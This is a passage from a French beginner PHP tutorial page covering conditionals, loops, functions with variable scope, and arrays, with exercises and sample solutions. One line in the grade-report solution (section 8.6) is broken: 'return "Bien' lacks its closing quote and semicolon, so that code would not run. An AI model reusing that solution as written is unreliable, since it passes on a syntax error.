                                <span class="tag">?></span>
                            </div>
                        </section>

                        <section class="section">
                            <h3>3. <code>if...elseif...else</code></h3>
                            <p>Pour tester plusieurs conditions, utilise <code>elseif</code> :</p>
                            <div class="code-block">
                                <span class="tag"><?php</span>
                                <span class="keyword">$note</span> = <span class="number">15</span>;
                                <span class="keyword">if</span> (<span class="keyword">$note</span> >= <span class="number">16</span>) {
                                    <span class="keyword">echo</span> <span class="string">"Très bien"</span>;
                                } <span class="keyword">elseif</span> (<span class="keyword">$note</span> >= <span class="number">10</span>) {
                                    <span class="keyword">echo</span> <span class="string">"Moyen"</span>;
                                } <span class="keyword">else</span> {
                                    <span class="keyword">echo</span> <span class="string">"Insuffisant"</span>;
                                }
                                <span class="tag">?></span>
                            </div>
                        </section>

                        <!-- SWITCH -->
                        <section class="section">
                            <h3>4. La structure <code>switch</code></h3>
                            <p><code>switch</code> est utile pour comparer une même variable à plusieurs valeurs possibles.</p>
                            <div class="code-block">
                                <span class="tag"><?php</span>
                                <span class="keyword">$jour</span> = <span class="string">"samedi"</span>;
                                <span class="keyword">switch</span> (<span class="keyword">$jour</span>) {
                                    <span class="keyword">case</span> <span class="string">"lundi"</span>:
                                        <span class="keyword">echo</span> <span class="string">"Début de semaine"</span>;
                                        <span class="keyword">break</span>;
                                    <span class="keyword">case</span> <span class="string">"samedi"</span>:
                                    <span class="keyword">case</span> <span class="string">"dimanche"</span>:
                                        <span class="keyword">echo</span> <span class="string">"C'est le week-end !"</span>;
                                        <span class="keyword">break</span>;
                                    <span class="keyword">default</span>:
                                        <span class="keyword">echo</span> <span class="string">"Jour ordinaire"</span>;
                                }
                                <span class="tag">?></span>
                            </div>
                        </section>

                        <!-- CONSEILS -->
                        <section class="section">
                            <h3>📌 Conseils et bonnes pratiques</h3>
                            <ul>
                                <li>Utilise <code>if</code> pour des conditions simples ou peu nombreuses.</li>
                                <li>Préfère <code>switch</code> quand tu dois comparer une même variable à plusieurs valeurs.</li>
                                <li>Pense à bien indenter ton code pour la lisibilité.</li>
                                <li>Les accolades <code>{ }</code> sont obligatoires si tu as plusieurs instructions dans le bloc.</li>
                                <li>N'oublie pas le <code>break</code> dans les cas du <code>switch</code> pour éviter la "cascade".</li>
                            </ul>
                        </section>

                        <!-- EXERCICE -->
                        <div class="test-section">
                            <h3>🎯 Exercice pratique</h3>
                            <p>Crée un fichier <code>conditions.php</code> et réalise les exercices suivants :</p>
                            <ol>
                                <li>Crée une variable <code>$age</code> avec ton âge</li>
                                <li>Utilise une structure if/else pour afficher si tu es majeur ou mineur</li>
                                <li>Crée une variable <code>$note</code> et utilise if/elseif/else pour afficher une appréciation :
                                    <ul>
                                        <li>Si note >= 16 : "Très bien"</li>
                                        <li>Si note >= 12 : "Bien"</li>
                                        <li>Si note >= 8 : "Moyen"</li>
                                        <li>Sinon : "À améliorer"</li>
                                    </ul>
                                </li>
                                <li>Utilise switch avec une variable <code>$jour</code> pour afficher un message différent selon le jour de la semaine</li>
                            </ol>

                            <p><strong>Solution exemple :</strong></p>
                            <div class="code-block">
                                <span class="tag"><?php</span>
                                <span class="comment">// Test avec l'âge</span>
                                <span class="keyword">$age</span> = <span class="number">20</span>;
                                <span class="keyword">if</span> (<span class="keyword">$age</span> >= <span class="number">18</span>) {
                                    <span class="keyword">echo</span> <span class="string">"Tu es majeur !<br>"</span>;
                                } <span class="keyword">else</span> {
                                    <span class="keyword">echo</span> <span class="string">"Tu es mineur.<br>"</span>;
                                }

                                <span class="comment">// Test avec la note</span>
                                <span class="keyword">$note</span> = <span class="number">15</span>;
                                <span class="keyword">if</span> (<span class="keyword">$note</span> >= <span class="number">16</span>) {
                                    <span class="keyword">echo</span> <span class="string">"Très bien<br>"</span>;
                                } <span class="keyword">elseif</span> (<span class="keyword">$note</span> >= <span class="number">12</span>) {
                                    <span class="keyword">echo</span> <span class="string">"Bien<br>"</span>;
                                } <span class="keyword">elseif</span> (<span class="keyword">$note</span> >= <span class="number">8</span>) {
                                    <span class="keyword">echo</span> <span class="string">"Moyen<br>"</span>;
                                } <span class="keyword">else</span> {
                                    <span class="keyword">echo</span> <span class="string">"À améliorer<br>"</span>;
                                }

                                <span class="comment">// Test avec le jour</span>
                                <span class="keyword">$jour</span> = <span class="string">"mercredi"</span>;
                                <span class="keyword">switch</span> (<span class="keyword">$jour</span>) {
                                    <span class="keyword">case</span> <span class="string">"lundi"</span>:
                                        <span class="keyword">echo</span> <span class="string">"Courage, c'est le début de semaine !"</span>;
                                        <span class="keyword">break</span>;
                                    <span class="keyword">case</span> <span class="string">"mercredi"</span>:
                                        <span class="keyword">echo</span> <span class="string">"On est à la moitié !"</span>;
                                        <span class="keyword">break</span>;
                                    <span class="keyword">case</span> <span class="string">"vendredi"</span>:
                                        <span class="keyword">echo</span> <span class="string">"Bientôt le week-end !"</span>;
                                        <span class="keyword">break</span>;
                                    <span class="keyword">case</span> <span class="string">"samedi"</span>:
                                    <span class="keyword">case</span> <span class="string">"dimanche"</span>:
                                        <span class="keyword">echo</span> <span class="string">"Bon week-end !"</span>;
                                        <span class="keyword">break</span>;
                                    <span class="keyword">default</span>:
                                        <span class="keyword">echo</span> <span class="string">"Bonne journée !"</span>;
                                }
                                <span class="tag">?></span>
                            </div>
                        </div>
                    </div>
                </div>
            </section>
            <section class="section part7">
                <h2>7. Les Boucles (while, for, foreach)</h2>
                
                <div class="concept-title">📚 Qu'est-ce qu'une boucle ?</div>
                <p>Les boucles sont des structures qui permettent de <strong>répéter automatiquement</strong> des instructions plusieurs fois. Imaginez que vous voulez afficher "Bonjour" 100 fois : au lieu d'écrire 100 lignes de code, vous utilisez une boucle !</p>

                <p>En PHP, nous avons 3 types principaux de boucles, chacune adaptée à une situation particulière :</p>
                <ul>
                    <li><strong>while</strong> : quand on ne sait pas combien de fois répéter</li>
                    <li><strong>for</strong> : quand on sait exactement combien de fois répéter</li>
                    <li><strong>foreach</strong> : pour parcourir des tableaux</li>
                </ul>

                <h3>7.1 La boucle while - "Tant que..."</h3>
                
                <div class="concept-title">🔄 Comment fonctionne while</div>
                <p>La boucle <code>while</code> signifie <em>"tant que cette condition est vraie, continue à faire ceci"</em>. Elle vérifie la condition avant chaque tour de boucle.</p>

                <h4>Structure de base :</h4>
                <pre><code>while (condition) {
                    // Ce qui se répète
                }</code></pre>

                        <p><strong>Exemple simple :</strong> Compter de 1 à 5</p>
                        <pre><code><?php
                $compteur = 1;

                while ($compteur <= 5) {
                    echo "Tour numéro : $compteur<br>";
                    $compteur++; // IMPORTANT : on augmente le compteur !
                }
                ?></code></pre>

                        <p><strong>Résultat affiché :</strong></p>
                        <div class="result-box">
                            Tour numéro : 1<br>
                            Tour numéro : 2<br>
                            Tour numéro : 3<br>
                            Tour numéro : 4<br>
                            Tour numéro : 5
                        </div>

                        <div class="warning-box">
                            <strong>Attention au piège :</strong> Si vous oubliez d'augmenter le compteur, la boucle ne s'arrêtera jamais ! C'est ce qu'on appelle une "boucle infinie".
                        </div>

                        <h4>Exemple pratique : Jeu de devinette</h4>
                        <pre><code><?php
                $nombreSecret = 7;
                $essai = 0;

                while ($essai != $nombreSecret) {
                    echo "Quel est le nombre secret entre 1 et 10 ?<br>";
                    // En réalité, on récupérerait la saisie de l'utilisateur
                    $essai = 5; // Simulation d'une réponse
                    echo "Vous avez dit : $essai<br>";
                    
                    if ($essai != $nombreSecret) {
                        echo "Raté ! Essayez encore...<br>";
                        break; // Pour éviter la boucle infinie dans cet exemple
                    }
                }

                if ($essai == $nombreSecret) {
                    echo "Bravo ! Vous avez trouvé !";
                }
                ?></code></pre>

                        <h3>7.2 La boucle for - "Répète X fois"</h3>
                        
                        <div class="concept-title">🎯 Pourquoi utiliser for</div>
                        <p>La boucle <code>for</code> est parfaite quand vous savez <strong>exactement</strong> combien de fois vous voulez répéter quelque chose. Elle regroupe tout en une seule ligne : le début, la condition d'arrêt, et l'incrémentation.</p>

                        <h4>Structure :</h4>
                        <pre><code>for (début; condition; incrémentation) {
                    // Ce qui se répète
                }</code></pre>

                        <p><strong>Exemple simple :</strong> Afficher les nombres de 1 à 10</p>
                        <pre><code><?php
                for ($i = 1; $i <= 10; $i++) {
                    echo "Nombre : $i<br>";
                }
                ?></code></pre>

                        <div class="explanation-box">
                            <strong>Décortiquons cette ligne :</strong>
                            <ul>
                                <li><code>$i = 1</code> : on commence à 1</li>
                                <li><code>$i <= 10</code> : on continue tant que i est inférieur ou égal à 10</li>
                                <li><code>$i++</code> : après chaque tour, on augmente i de 1</li>
                            </ul>
                        </div>

                        <h4>Exemple pratique : Table de multiplication</h4>
                        <pre><code><?php
                $nombre = 7;
                echo "<h4>Table de multiplication de $nombre :</h4>";

                for ($i = 1; $i <= 10; $i++) {
                    $resultat = $nombre * $i;
                    echo "$nombre × $i = $resultat<br>";
                }
                ?></code></pre>

                        <p><strong>Résultat :</strong></p>
                        <div class="result-box">
                            <strong>Table de multiplication de 7 :</strong><br>
                            7 × 1 = 7<br>
                            7 × 2 = 14<br>
                            7 × 3 = 21<br>
                            ... et ainsi de suite jusqu'à 7 × 10 = 70
                        </div>

                        <h3>7.3 La boucle foreach - "Pour chaque élément"</h3>
                        
                        <div class="concept-title">📋 La boucle magique pour les tableaux</div>
                        <p>La boucle <code>foreach</code> est <strong>spécialement conçue</strong> pour parcourir des tableaux. Elle prend automatiquement chaque élément du tableau, un par un.</p>

                        <h4>Deux façons de l'utiliser :</h4>
                        
                        <p><strong>1. Pour récupérer seulement les valeurs :</strong></p>
                        <pre><code>foreach ($tableau as $valeur) {
                    // Faire quelque chose avec $valeur
                }</code></pre>

                        <p><strong>2. Pour récupérer les clés ET les valeurs :</strong></p>
                        <pre><code>foreach ($tableau as $cle => $valeur) {
                    // Faire quelque chose avec $cle et $valeur
                }</code></pre>

                        <h4>Exemple simple : Liste de courses</h4>
                        <pre><code><?php
                $courses = ["pain", "lait", "œufs", "fromage"];

                echo "<h4>Ma liste de courses :</h4>";
                echo "<ul>";

                foreach ($courses as $produit) {
                    echo "<li>$produit</li>";
                }

                echo "</ul>";
                ?></code></pre>

                        <p><strong>Résultat :</strong></p>
                        <div class="result-box">
                            <strong>Ma liste de courses :</strong>
                            <ul>
                                <li>pain</li>
                                <li>lait</li>
                                <li>œufs</li>
                                <li>fromage</li>
                            </ul>
                        </div>

                        <h4>Exemple avec clés et valeurs : Informations personnelles</h4>
                        <pre><code><?php
                $personne = [
                    "nom" => "Dupont",
                    "prenom" => "Jean",
                    "age" => 25,
                    "ville" => "Paris"
                ];

                echo "<h4>Informations :</h4>";

                foreach ($personne as $cle => $valeur) {
                    echo "<strong>$cle</strong> : $valeur<br>";
                }
                ?></code></pre>

                        <p><strong>Résultat :</strong></p>
                        <div class="result-box">
                            <strong>Informations :</strong><br>
                            <strong>nom</strong> : Dupont<br>
                            <strong>prenom</strong> : Jean<br>
                            <strong>age</strong> : 25<br>
                            <strong>ville</strong> : Paris
                        </div>

                        <h3>7.4 Contrôler les boucles : break et continue</h3>
                        
                        <div class="concept-title">🛑 Les mots-clés de contrôle</div>
                        <p>Parfois, on veut <strong>sortir</strong> d'une boucle avant la fin, ou <strong>passer</strong> au tour suivant sans finir le tour actuel.</p>

                        <h4>break : "Arrête tout !"</h4>
                        <p><code>break</code> sort complètement de la boucle.</p>
                        
                        <pre><code><?php
                for ($i = 1; $i <= 10; $i++) {
                    if ($i == 5) {
                        echo "Je m'arrête à 5 !<br>";
                        break; // Sort de la boucle
                    }
                    echo "Nombre : $i<br>";
                }
                echo "Fini !";
                ?></code></pre>

                        <h4>continue : "Passe au suivant !"</h4>
                        <p><code>continue</code> passe directement au tour suivant.</p>
                        
                        <pre><code><?php
                for ($i = 1; $i <= 5; $i++) {
                    if ($i == 3) {
                        continue; // Ignore le 3
                    }
                    echo "Nombre : $i<br>";
                }
                ?></code></pre>

                        <p><strong>Résultat :</strong> 1, 2, 4, 5 (le 3 est ignoré)</p>

                        <h3>7.5 Exercice pratique : Mini calculatrice</h3>
                        
                        <p><strong>Objectif :</strong> Créer un programme qui affiche les tables de multiplication de 1 à 5.</p>
                        
                        <p><strong>Instructions :</strong></p>
                        <ol>
                            <li>Utilisez une boucle <code>for</code> pour parcourir les nombres de 1 à 5</li>
                            <li>Pour chaque nombre, affichez sa table de multiplication de 1 à 10</li>
                            <li>Utilisez une deuxième boucle <code>for</code> imbriquée</li>
                            <li>Présentez le résultat de façon claire</li>
                        </ol>

                        <p><strong>Bonus :</strong> Ajoutez une condition pour colorier différemment les résultats pairs et impairs !</p>

                        <details>
                            <summary><strong>💡 Voir la solution</strong></summary>
                            <pre><code><?php
                echo "<h3>Tables de multiplication de 1 à 5</h3>";

                for ($table = 1; $table <= 5; $table++) {
                    echo "<h4>Table de $table :</h4>";
                    
                    for ($multiplicateur = 1; $multiplicateur <= 10; $multiplicateur++) {
                        $resultat = $table * $multiplicateur;
                        $couleur = ($resultat % 2 == 0) ? "blue" : "red";
                        
                        echo "<span style='color: $couleur'>";
                        echo "$table × $multiplicateur = $resultat";
                        echo "</span><br>";
                    }
                    
                    echo "<br>"; // Espacement entre les tables
                }
                ?></code></pre>
                        </details>
                    </section>

                    <!-- Partie 8: Fonctions et portée des variables -->
                    <section class="section part8">
                        <h2>8. Fonctions et portée des variables</h2>
                        
                        <div class="concept-title">🧪 Qu'est-ce qu'une fonction ?</div>
                        <p>Imaginez que vous cuisinez souvent des crêpes. Au lieu de réécrire chaque fois toute la recette, vous la notez une fois et vous la réutilisez ! Les <strong>fonctions</strong> en PHP, c'est pareil : des "recettes de code" que vous pouvez réutiliser.</p>

                        <p>Une fonction est un <strong>bloc de code réutilisable</strong> qui :</p>
                        <ul>
                            <li>A un nom spécifique</li>
                            <li>Peut recevoir des informations (paramètres)</li>
                            <li>Fait un traitement</li>
                            <li>Peut renvoyer un résultat</li>
                        </ul>

                        <h3>8.1 Créer sa première fonction</h3>
                        
                        <p>Commençons par quelque chose de simple : une fonction qui dit bonjour.</p>

                        <h4>Structure de base :</h4>
                        <pre><code>function nomDeLaFonction() {
                    // Ce que fait la fonction
                }</code></pre>

                        <h4>Exemple simple :</h4>
                        <pre><code><?php
                function direBonjour() {
                    echo "Bonjour tout le monde !<br>";
                }

                // Pour utiliser la fonction :
                direBonjour();
                direBonjour();
                direBonjour();
                ?></code></pre>

                        <p><strong>Résultat :</strong></p>
                        <div class="result-box">
                            Bonjour tout le monde !<br>
                            Bonjour tout le monde !<br>
                            Bonjour tout le monde !
                        </div>

                        <div class="explanation-box">
                            <strong>Avantage :</strong> Une seule ligne de code <code>direBonjour()</code> remplace tout le contenu de la fonction !
                        </div>

                        <h3>8.2 Fonctions avec paramètres</h3>
                        
                        <div class="concept-title">🔧 Personnaliser les fonctions</div>
                        <p>C'est bien, mais si on veut personnaliser le message ? On utilise des <strong>paramètres</strong> ! Ce sont comme des "ingrédients" qu'on donne à notre "recette".</p>

                        <h4>Fonction avec un paramètre :</h4>
                        <pre><code><?php
                function direBonjour($nom) {
                    echo "Bonjour $nom !<br>";
                }

                // Utilisation avec différents noms :
                direBonjour("Marie");
                direBonjour("Pierre");
                direBonjour("Julie");
                ?></code></pre>

                        <p><strong>Résultat :</strong></p>
                        <div class="result-box">
                            Bonjour Marie !<br>
                            Bonjour Pierre !<br>
                            Bonjour Julie !
                        </div>

                        <h4>Fonction avec plusieurs paramètres :</h4>
                        <pre><code><?php
                function presenter($nom, $age) {
                    echo "Je m'appelle $nom et j'ai $age ans.<br>";
                }

                presenter("Alice", 25);
                presenter("Bob", 30);
                ?></code></pre>

                        <h4>Paramètres avec valeurs par défaut :</h4>
                        <p>On peut donner une valeur par défaut à un paramètre. Si on ne précise rien, cette valeur sera utilisée.</p>

                        <pre><code><?php
                function saluer($nom, $formule = "Bonjour") {
                    echo "$formule $nom !<br>";
                }

                saluer("Marie");           // Utilisera "Bonjour"
                saluer("Pierre", "Salut"); // Utilisera "Salut"
                ?></code></pre>

                        <p><strong>Résultat :</strong></p>
                        <div class="result-box">
                            Bonjour Marie !<br>
                            Salut Pierre !
                        </div>

                        <h3>8.3 Fonctions qui retournent une valeur</h3>
                        
                        <div class="concept-title">↩️ Récupérer un résultat</div>
                        <p>Parfois, on veut que la fonction nous <strong>donne un résultat</strong> au lieu de juste afficher quelque chose. On utilise <code>return</code>.</p>

                        <h4>Exemple : Calculatrice simple</h4>
                        <pre><code><?php
                function additionner($a, $b) {
                    $resultat = $a + $b;
                    return $resultat; // On renvoie le résultat
                }

                // Maintenant on peut utiliser le résultat :
                $somme = additionner(5, 3);
                echo "5 + 3 = $somme<br>";

                // Ou directement dans un echo :
                echo "10 + 7 = " . additionner(10, 7) . "<br>";
                ?></code></pre>

                        <h4>Exemple pratique : Calculer une remise</h4>
                        <pre><code><?php
                function calculerRemise($prix, $pourcentage) {
                    $remise = ($prix * $pourcentage) / 100;
                    return $remise;
                }

                function prixFinal($prix, $pourcentage) {
                    $remise = calculerRemise($prix, $pourcentage);
                    return $prix - $remise;
                }

                $prixOriginal = 100;
                $reduction = 20; // 20%

                echo "Prix original : $prixOriginal €<br>";
                echo "Remise (" . $reduction . "%) : " . calculerRemise($prixOriginal, $reduction) . " €<br>";
                echo "Prix final : " . prixFinal($prixOriginal, $reduction) . " €<br>";
                ?></code></pre>

                        <h3>8.4 La portée des variables</h3>
                        
                        <div class="concept-title">🏠 Les variables ont leur "maison"</div>
                        <p>Les variables ont une <strong>"zone de vie"</strong> appelée "portée" (scope en anglais). C'est comme les pièces d'une maison : certaines variables ne "vivent" que dans certaines pièces !</p>

                        <h4>Variables locales</h4>
                        <p>Les variables créées <strong>dans une fonction</strong> ne sont visibles que dans cette fonction.</p>

                        <pre><code><?php
                function maFonction() {
                    $variableLocale = "Je suis dans la fonction";
                    echo $variableLocale . "<br>";
                }

                maFonction(); // Ça marche !

                // Cette ligne causerait une erreur :
                // echo $variableLocale; // Erreur ! Variable non définie
                ?></code></pre>

                        <h4>Variables globales</h4>
                        <p>Les variables créées <strong>en dehors</strong> des fonctions sont globales, mais pour les utiliser dans une fonction, il faut le préciser avec <code>global</code>.</p>

                        <pre><code><?php
                $nom = "Alice"; // Variable globale

                function afficherNom() {
                    global $nom; // On dit qu'on veut utiliser la variable globale
                    echo "Le nom est : $nom<br>";
                }

                afficherNom();
                ?></code></pre>

                        <h4>Exemple pratique : Compteur</h4>
                        <pre><code><?php
                $compteur = 0; // Variable globale

                function incrementer() {
                    global $compteur;
                    $compteur++;
                    echo "Compteur : $compteur<br>";
                }

                incrementer(); // Compteur : 1
                incrementer(); // Compteur : 2
                incrementer(); // Compteur : 3
                ?></code></pre>

                        <h3>8.5 Bonnes pratiques</h3>
                        
                        <h4>1. Noms de fonctions clairs</h4>
                        <pre><code>// ✅ Bien :
                function calculerTaxe($prix) { ... }
                function verifierAge($age) { ... }

                // ❌ Pas bien :
                function calc($p) { ... }
                function check($x) { ... }</code></pre>

                        <h4>2. Une fonction = une tâche</h4>
                        <p>Chaque fonction doit faire <strong>une seule chose</strong>, mais bien !</p>

                        <pre><code>// ✅ Bien :
                function calculerTTC($prixHT, $taux) {
                    return $prixHT * (1 + $taux/100);
                }

                function afficherPrix($prix) {
                    echo "Prix : " . number_format($prix, 2) . " €<br>";
                }</code></pre>

                        <h4>3. Éviter les variables globales</h4>
                        <p>Préférez passer les valeurs en paramètres plutôt qu'utiliser des variables globales.</p>

                        <h3>8.6 Exercice pratique : Système de notes</h3>
                        
                        <p><strong>Objectif :</strong> Créer un système pour gérer les notes d'un étudiant.</p>
                        
                        <p><strong>Créez ces fonctions :</strong></p>
                        <ol>
                            <li><code>calculerMoyenne($notes)</code> : calcule la moyenne d'un tableau de notes</li>
                            <li><code>obtenirMention($moyenne)</code> : retourne la mention selon la moyenne
                                <ul>
                                    <li>16+ : "Très bien"</li>
                                    <li>14+ : "Bien"</li>
                                    <li>12+ : "Assez bien"</li>
                                    <li>10+ : "Passable"</li>
                                    <li>Moins : "Insuffisant"</li>
                                </ul>
                            </li>
                            <li><code>afficherBulletin($nom, $notes)</code> : affiche un bulletin complet</li>
                        </ol>

                        <p><strong>Testez avec :</strong></p>
                        <pre><code>$notesJean = [15, 12, 18, 14, 16];
                afficherBulletin("Jean", $notesJean);</code></pre>

                        <details>
                            <summary><strong>💡 Voir la solution</strong></summary>
                            <pre><code><?php
                function calculerMoyenne($notes) {
                    $somme = 0;
                    foreach ($notes as $note) {
                        $somme += $note;
                    }
                    return $somme / count($notes);
                }

                function obtenirMention($moyenne) {
                    if ($moyenne >= 16) {
                        return "Très bien";
                    } elseif ($moyenne >= 14) {
                        return "Bien
                                } elseif ($moyenne >= 12) {
                        return "Assez bien";
                    } elseif ($moyenne >= 10) {
                        return "Passable";
                    } else {
                        return "Insuffisant";
                    }
                }

                function afficherBulletin($nom, $notes) {
                    echo "<h3>Bulletin de $nom</h3>";
                    
                    echo "Notes : ";
                    foreach ($notes as $note) {
                        echo "$note ";
                    }
                    echo "<br>";
                    
                    $moyenne = calculerMoyenne($notes);
                    $mention = obtenirMention($moyenne);
                    
                    echo "Moyenne : " . number_format($moyenne, 2) . "/20<br>";
                    echo "Mention : $mention<br>";
                }

                // Test
                $notesJean = [15, 12, 18, 14, 16];
                afficherBulletin("Jean", $notesJean);
                ?></code></pre>
                        </details>
                    </section>

                    <!-- Partie 9: Tableaux -->
                    <section class="section part9">
                        <h2>9. Tableaux (simples et associatifs)</h2>
                        
                        <div class="concept-title">📦 Qu'est-ce qu'un tableau ?</div>
                        <p>Un <strong>tableau</strong> est comme un tiroir avec plusieurs compartiments : au lieu de créer une variable pour chaque information, vous pouvez toutes les ranger dans un seul "tiroir" ! C'est l'un des outils les plus utiles en programmation.</p>

                        <p>Imaginez que vous voulez stocker les prénoms de vos amis. Au lieu de faire :</p>
                        <pre><code>$ami1 = "Marie";
                $ami2 = "Pierre";  
                $ami3 = "Julie";</code></pre>

                        <p>Vous pouvez faire :</p>
                        <pre><code>$amis = ["Marie", "Pierre", "Julie"];</code></pre>

                        <div class="explanation-box">
                            C'est plus simple et plus pratique !
                        </div>

                        <h3>9.1 Tableaux indexés (ou simples)</h3>
                        
                        <div class="concept-title">🔢 Les tableaux avec des numéros</div>
                        <p>Les tableaux indexés utilisent des <strong>numéros</strong> pour identifier chaque élément. La numérotation commence à <code>0</code> (pas 1 !)</p>

                        <h4>Créer un tableau :</h4>
                        <pre><code><?php
                // Méthode moderne (recommandée)
                $fruits = ["pomme", "banane", "orange"];

                // Méthode ancienne (mais qui marche toujours)
                $legumes = array("carotte", "salade", "tomate");

                // Affichage
                echo $fruits[0]; // pomme
                echo $fruits[1]; // banane
                echo $fruits[2]; // orange
                ?></code></pre>

                        <p><strong>📝 Schéma :</strong></p>
                        <div class="result-box">
                            <table border="1" style="border-collapse: collapse; width: 100%;">
                                <tr><th>Index</th><th>0</th><th>1</th><th>2</th></tr>
                                <tr><th>Valeur</th><td>pomme</td><td>banane</td><td>orange</td></tr>
                            </table>
                        </div>

                        <h4>Ajouter des éléments :</h4>
                        <pre><code><?php
                $couleurs = ["rouge", "vert"];

                // Ajouter à la fin
                $couleurs[] = "bleu";        // Index 2
                $couleurs[] = "jaune";       // Index 3

                // Modifier un élément existant
                $couleurs[1] = "violet";     // Change "vert" en "violet"

                // Afficher tout le tableau
                print_r($couleurs);
                ?></code></pre>

                <!-- Exemple pratique : Liste de courses -->
                <div class="example-section">
                    <h4>Exemple pratique : Liste de courses</h4>
                    <pre>
                        <code>
                            <?php
                                // Déclaration du tableau de courses
                                $courses = ["pain", "lait", "œufs"];

                                // Affichage de la liste
                                echo "<h4>Ma liste de courses :</h4>";
                                echo "<ol>"; // Liste numérotée

                                // Parcours du tableau avec une boucle for
                                for ($i = 0; $i < count($courses); $i++) {
                                    echo "<li>" . $courses[$i] . "</li>";
                                }

                                echo "</ol>";

                                // Ajout d'un nouvel article
                                $courses[] = "fromage";
                                echo "<p>J'ai ajouté : " . $courses[3] . "</p>";
                            ?>
                        </code>
                    </pre>
                </div>

                        <h3>9.2 Tableaux associatifs</h3>
                        
                        <div class="concept-title">🏷️ Les tableaux avec des étiquettes</div>
                        <p>Les tableaux associatifs utilisent des <strong>mots</strong> (clés) au lieu de numéros. C'est comme mettre une étiquette sur chaque compartiment !</p>

                        <h4>Créer un tableau associatif :</h4>
                        <pre>
                            <code>
                                <?php
                                    $personne = [
                                        "nom" => "Dupont",
                                        "prenom" => "Marie", 
                                        "age" => 25,
                                        "ville" => "Paris"
                                    ];

                                    // Accès aux valeurs
                                    echo $personne["nom"];     // Dupont
                                    echo $personne["prenom"];  // Marie
                                    echo $personne["age"];     // 25
                                ?>
                            </code>
                        </pre>

                        <p><strong>📝 Schéma :</strong></p>
                        <div class="result-box">
                            <table border="1" style="border-collapse: collapse; width: 100%;">
                                <tr><th>Clé</th><th>nom</th><th>prenom</th><th>age</th><th>ville</th></tr>
                                <tr><th>Valeur</th><td>Dupont</td><td>Marie</td><td>25</td><td>Paris</td></tr>
                            </table>
                        </div>

                        <h4>Modifier et ajouter :</h4>
                        <pre>
                            <code>
                                <?php
                                    $voiture = [
                                        "marque" => "Renault",
                                        "modele" => "Clio",
                                        "annee" => 2020
                                    ];

                                    // Modifier
                                    $voiture["annee"] = 2021;

                                    // Ajouter
                                    $voiture["couleur"] = "rouge";
                                    $voiture["prix"] = 15000;

                                    // Afficher toutes les informations
                                    foreach ($voiture as $caracteristique => $valeur) {
                                        echo "$caracteristique : $valeur<br>";
                                    }
                                ?>
                            </code>
                        </pre>

                        <h4>Exemple pratique : Carnet d'adresses</h4>
                        <pre>
                            <code>
                                <?php
                                    $contact = [
                                        "nom" => "Martin",
                                        "telephone" => "06.12.34.56.78",
                                        "email" => "martin@exemple.com",
                                        "adresse" => "123 rue de la Paix, 75001 Paris"
                                    ];

                                    echo "<h4>Contact : " . $contact["nom"] . "</h4>";
                                    echo "<p><strong>Téléphone :</strong> " . $contact["telephone"] . "</p>";
                                    echo "<p><strong>Email :</strong> " . $contact["email"] . "</p>";
                                    echo "<p><strong>Adresse :</strong> " . $contact["adresse"] . "</p>";
                                ?>
                            </code>
                        </pre>

                        <h3>9.3 Parcourir les tableaux</h3>
                        
                        <div class="concept-title">🚶‍♂️ Visiter tous les éléments</div>
                        <p>Pour afficher ou traiter tous les éléments d'un tableau, on utilise souvent <code>foreach</code>.</p>

                        <h4>Avec un tableau simple :</h4>
                        <pre>
                            <code>
                                <?php
                                    $sports = ["football", "tennis", "natation", "basketball"];

                                    echo "<h4>Sports pratiqués :</h4>";
                                    echo "<ul>";

                                    foreach ($sports as $sport) {
                                        echo "<li>$sport</li>";
                                    }

                                    echo "</ul>";
                                ?>
                            </code>
                        </pre>

                        <h4>Avec un tableau associatif :</h4>
                        <pre>
                            <code>
                                <?php
                                    $notes = [
                                        "Mathématiques" => 16,
                                        "Français" => 14,
                                        "Histoire" => 15,
                                        "Anglais" => 17
                                    ];

                                    echo "<h4>Bulletin de notes :</h4>";

                                    foreach ($notes as $matiere => $note) {
                                        echo "<p>$matiere : $note/20</p>";
                                    }
                                ?>
                            </code>
                        </pre>

                        <h3>9.4 Tableaux multidimensionnels</h3>
                        
                        <div class="concept-title">📦📦 Des boîtes dans des boîtes</div>
                        <p>Un tableau peut contenir... d'autres tableaux ! C'est comme des boîtes dans des boîtes.</p>

                        <h4>Exemple : Plusieurs personnes</h4>
                        <pre>
                            <code>
                                <?php
                                    $classe = [
                                        [
                                            "nom" => "Dupont",
                                            "prenom" => "Marie",
                                            "note" => 16
                                        ],
                                        [
                                            "nom" => "Martin", 
                                            "prenom" => "Pierre",
                                            "note" => 14
                                        ],
                                        [
                                            "nom" => "Bernard",
                                            "prenom" => "Julie", 
                                            "note" => 18
                                        ]
                                    ];

                                    echo "<h4>Liste de la classe :</h4>";

                                    foreach ($classe as $eleve) {
                                        echo "<p>";
                                        echo $eleve["prenom"] . " " . $eleve["nom"];
                                        echo " - Note : " . $eleve["note"] . "/20";
                                        echo "</p>";
                                    }
                                ?>
                            </code>
                        </pre>

                        <h3>9.5 Fonctions utiles pour les tableaux</h3>
                        
                        <div class="concept-title">🛠️ Les outils pratiques</div>

                        <h4>Informations sur le tableau :</h4>
                        <pre>
                            <code>
                                <?php
                                    $animaux = ["chat", "chien", "oiseau", "poisson"];

                                    echo "Nombre d'animaux : " . count($animaux) . "<br>";
                                    echo "Le tableau est-il vide ? " . (empty($animaux) ? "Oui" : "Non") . "<br>";
                                    echo "Y a-t-il un chat ? " . (in_array("chat", $animaux) ? "Oui" : "Non") . "<br>";
                                ?>
                            </code>
                        </pre>

                        <h4>Ajouter et supprimer :</h4>
                        <pre>
                            <code>
                                    <?php
                                    $pile = ["premier", "deuxième"];

                                    // Ajouter à la fin
                                    array_push($pile, "troisième");

                                    // Ajouter au début  
                                    array_unshift($pile, "nouveau premier");

                                    // Supprimer le dernier
                                    $dernier = array_pop($pile);

                                    // Supprimer le premier
                                    $premier = array_shift($pile);

                                    print_r($pile);
                                ?>
                            </code>
                        </pre>

                        <h4>Trier :</h4>
                        <pre>
                            <code>
                                <?php
                                    $nombres = [5, 2, 8, 1, 9];

                                    // Tri croissant
                                    sort($nombres);
                                    echo "Croissant : " . implode(", ", $nombres) . "<br>";

                                    // Tri décroissant
                                    rsort($nombres);
                                    echo "Décroissant : " . implode(", ", $nombres) . "<br>";
                                ?>
                            </code>
                        </pre>

                        <h3>9.6 Exercice pratique : Gestionnaire de bibliothèque</h3>
                        
                        <p><strong>Objectif :</strong> Créer un système simple pour gérer des livres.</p>
                        
                        <p><strong>Créez :</strong></p>
                        <ol>
                            <li>Un tableau pour stocker plusieurs livres avec :
                                <ul>
                                    <li>titre</li>
                                    <li>auteur</li>
                                    <li>année</li>
                                    <li>genre</li>
